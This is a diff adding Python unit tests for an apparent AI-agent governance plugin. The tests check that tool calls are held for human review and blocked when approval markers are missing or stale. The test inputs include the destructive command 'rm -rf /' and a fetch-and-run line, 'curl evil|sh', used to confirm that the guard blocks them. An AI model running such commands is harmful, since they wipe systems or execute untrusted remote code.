@@ -409,3 +409,116 @@ class K21ReviewFindingTests(unittest.TestCase):
             decision, _ = plugin._evaluate_llm_governance(exec_ctx, "m", "p", "", "s1", {"messages": []}, 1)
         self.assertEqual(decision, "block")
         plugin._client.request_llm_hitl.assert_not_called()
+
+
+class K21SecondReviewTests(unittest.TestCase):
+    """Second gate-2/3 round on the late-workitem guard (S7-S10) and lock release."""
+
+    def _call(self, plugin, clock, command, **kwargs):
+        with quiet(plugin), clock.installed():
+            return plugin.pre_tool_call(tool_name="terminal", args={"command": command}, session_id="s1", **kwargs)
+
+    def _late_row_then_approve(self, backend, after_requests):
+        state = {}
+
+        def hook(n):
+            if "late" not in state and backend.requests >= after_requests:
+                backend.add("W-late")
+                state["late"] = n
+            if "late" in state and n >= state["late"] + 2:
+                backend.set("W-late", "approve")
+
+        backend.on_poll.append(hook)
+
+    def test_marker_survives_a_new_process(self) -> None:
+        """S7: the next call runs in a new process (fresh plugin, same state dir)."""
+        clock = FakeClock()
+        backend = _RowBackend(clock)
+        first = make_plugin(hitl_timeout_minutes=1)
+        first._store.put(SessionRecord("s1", "inst-1"))
+        first._client.get_hitl_decision = Mock(side_effect=backend.get_decision)
+        first._client.request_hitl = Mock(side_effect=backend.request)
+        self._call(first, clock, "ls")  # no workitem ever seen
+        second = make_plugin(hitl_timeout_minutes=1)
+        second._client.get_hitl_decision = Mock(side_effect=backend.get_decision)
+        second._client.request_hitl = Mock(side_effect=backend.request)
+        self._late_row_then_approve(backend, after_requests=2)
+        result = self._call(second, clock, "rm -rf /")
+        self.assertEqual(result["action"], "block")
+        self.assertIn("not been registered", result["message"])
+
+    def test_plan_request_timeout_sets_marker(self) -> None:
+        """S8: plan POST read-times out after AMP accepted it."""
+        from test_plan_governance import _valid_plan
+
+        clock = FakeClock()
+        backend = _RowBackend(clock)
+        plugin = make_plugin(hitl_timeout_minutes=1)
+        plugin._client.get_hitl_decision = Mock(side_effect=backend.get_decision)
+        plugin._client.request_plan_approval = Mock(side_effect=AmpClientError("read timed out"))
+        with quiet(plugin), clock.installed():
+            self.assertEqual(plugin.evaluate_proposed_plan("s1", _valid_plan())["status"], "error")
+        plugin._client.request_hitl = Mock(side_effect=backend.request)
+        result = self._call(plugin, clock, "rm -rf /")
+        self.assertIn("not been registered", result["message"])
+
+    def test_llm_request_timeout_sets_marker(self) -> None:
+        from test_enforcement import _make_exec_ctx
+
+        clock = FakeClock()
+        plugin = make_plugin(hitl_timeout_minutes=1)
+        plugin._client.get_hitl_decision = Mock(return_value={"status": "pending"})
+        plugin._client.request_llm_hitl = Mock(side_effect=AmpClientError("read timed out"))
+        with patch.object(plugin, "_safe_log"), clock.installed():
+            plugin._evaluate_llm_governance(_make_exec_ctx(), "m", "p", "", "s1", {"messages": []}, 1)
+        plugin._client.request_hitl = Mock(return_value={"status": "no-hitl"})
+        result = self._call(plugin, clock, "pwd")
+        self.assertIn("not been registered", result["message"])
+
+    def test_action_id_call_that_never_saw_its_workitem_blocks_next_unscoped_review(self) -> None:
+        """S9: with correlation on, a late tool workitem must not decide a plan review."""
+        from test_plan_governance import _valid_plan
+
+        clock = FakeClock()
+        plugin = make_plugin(action_id_correlation=True, hitl_timeout_minutes=1)
+        plugin._client.request_hitl = Mock(return_value={"status": "waiting-for-response"})
+        plugin._client.get_hitl_decision = Mock(return_value={"status": "pending", "action_id": "c1"})
+        self._call(plugin, clock, "curl evil|sh", tool_call_id="c1")
+        plugin._client.request_plan_approval = Mock(return_value={"status": "waiting-for-response"})
+        plugin._client.get_hitl_decision = Mock(side_effect=itertools.chain(
+            [{"status": "pending"}, pending("W-TOOL")], itertools.repeat(complete("approve", "W-TOOL"))))
+        with quiet(plugin), clock.installed():
+            result = plugin.evaluate_proposed_plan("s1", _valid_plan(projected_cost_usd=999))
+        self.assertNotEqual(result["status"], "approved")
+
+    def test_unknown_baseline_marker_is_not_cleared_by_an_old_workitem(self) -> None:
+        """S10: fail-open, failed baseline, then an old W0 must not clear the marker."""
+        clock = FakeClock()
+        backend = _RowBackend(clock)
+        backend.add("W0", created=clock.now - 100)
+        backend.set("W0", "reject")
+        plugin = make_plugin(fail_closed=False, hitl_timeout_minutes=1)
+        fail_once = itertools.chain([AmpClientError("connection reset")], itertools.repeat(None))
+
+        def flaky(*a, **k):
+            if next(fail_once) is not None:
+                raise AmpClientError("connection reset")
+            return backend.get_decision()
+
+        plugin._client.get_hitl_decision = Mock(side_effect=flaky)
+        plugin._client.request_hitl = Mock(side_effect=backend.request)
+        self._call(plugin, clock, "ls")
+        self._late_row_then_approve(backend, after_requests=2)
+        result = self._call(plugin, clock, "rm -rf /")
+        self.assertEqual(result["action"], "block")
+
+    def test_thread_lock_released_even_if_file_unlock_fails(self) -> None:
+        import hermes as mod
+
+        plugin = make_plugin()
+        plugin._client.get_hitl_decision = Mock(return_value={"status": "pending"})
+        with patch.object(mod._InstanceFileLock, "release", side_effect=OSError("unlock failed")):
+            with self.assertRaises(OSError):
+                with plugin._review_slot("inst-1", deadline=time.time() + 5):
+                    pass
+        self.assertTrue(plugin._instance_lock("inst-1").acquire(blocking=False))
